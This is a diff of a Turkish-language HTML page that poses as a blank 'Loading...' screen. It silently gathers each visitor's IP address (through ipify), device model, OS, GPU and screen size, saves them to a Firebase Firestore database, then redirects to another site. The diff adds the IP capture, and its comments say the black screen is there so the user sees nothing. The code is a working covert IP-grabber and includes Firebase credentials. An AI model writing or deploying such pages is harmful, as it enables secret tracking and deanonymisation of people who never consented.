@@ -2,17 +2,10 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Yükleniyor...</title>
-    <style>
-        /* Kullanıcı bir şey görmesin diye ekranı siyah yapıyoruz */
-        body { background: #000; color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .loader { color: #111; } /* Çok hafif bir yazı, istersen tamamen silebilirsin */
-    </style>
+    <style>body { background: #000; margin: 0; }</style>
 </head>
 <body>
-
-<div class="loader">Sayfa Yükleniyor...</div>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
@@ -21,6 +14,7 @@
     const firebaseConfig = {
         apiKey: "AIzaSyB0XVcXiShBEebqnHokvrb8S5XpKfTRAJA",
         authDomain: "nexarasunar.firebaseapp.com",
+        databaseURL: "https://nexarasunar-default-rtdb.firebaseio.com",
         projectId: "nexarasunar",
         storageBucket: "nexarasunar.firebasestorage.app",
         messagingSenderId: "698168474254",
@@ -30,16 +24,21 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    // Hangi sayfaya yönlendirilsin?
-    const yonlendirilecekAdres = "https://www.google.com"; // BURAYI DEĞİŞTİR
+    const yonlendirilecekAdres = "https://www.google.com"; // Burayı istediğin siteyle değiştir
 
-    async function captureAndRedirect() {
+    async function captureAndSend() {
+        let ip = "Bilinmiyor";
         let model = "Bilinmiyor";
         let os = navigator.platform;
         let gpu = "Tespit edilemedi";
 
         try {
-            // GPU ve Model Analizi
+            // 1. IP Adresini Çek
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+
+            // 2. GPU ve Model Analizi
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl');
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
@@ -49,28 +48,25 @@
                 const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
                 if (hints.model) model = hints.model;
             }
-        } catch (e) {}
-
-        const screenRes = `${window.screen.width} x ${window.screen.height}`;
+        } catch (e) { console.log(e); }
 
         try {
-            // Veriyi sessizce Firestore'a gönder
+            // 3. Firebase Firestore'a Kaydet
             await addDoc(collection(db, "ziyaretler"), {
+                ip: ip,
                 model: model,
                 os: os,
                 gpu: gpu,
-                screen: screenRes,
+                screen: `${window.screen.width}x${window.screen.height}`,
                 tarih: serverTimestamp()
             });
-        } catch (e) {
-            console.error("Hata olsa bile yönlendir...");
-        } finally {
-            // Veri gitsin ya da gitmesin, kullanıcıyı yönlendir
-            window.location.href = yonlendirilecekAdres;
-        }
+        } catch (e) { }
+
+        // 4. Yönlendir
+        window.location.href = yonlendirilecekAdres;
     }
 
-    window.onload = captureAndRedirect;
+    window.onload = captureAndSend;
 </script>
 </body>
 </html>
